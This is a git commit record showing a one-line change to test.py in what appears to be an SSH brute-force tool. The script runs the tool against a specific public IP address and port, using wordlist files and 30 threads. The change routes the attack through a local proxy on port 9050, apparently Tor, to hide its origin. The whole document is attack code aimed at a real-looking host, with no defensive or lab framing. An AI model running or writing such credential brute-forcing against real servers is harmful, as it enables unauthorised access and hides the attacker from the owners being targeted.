e6e7b387d334449f57fe278a79f17e50c53181ae
Sina Tamari <60593818+sinatamari@users.noreply.github.com>
2020-10-22 22:57:48 +0330

    Update test.py

--- test.py
+++ test.py
@@ -1,4 +1,4 @@
 from ssh_class import ssh_brute_force
  
-obj = ssh_brute_force(ip='185.183.11.129',port=9001,users='./usernames.txt',passes='./usernames.txt',threads=30)
+obj = ssh_brute_force(ip='185.183.11.129',port=9001,users='./usernames.txt',passes='./usernames.txt',threads=30,proxies=[['127.0.0.1',9050]])
 obj.RUN()
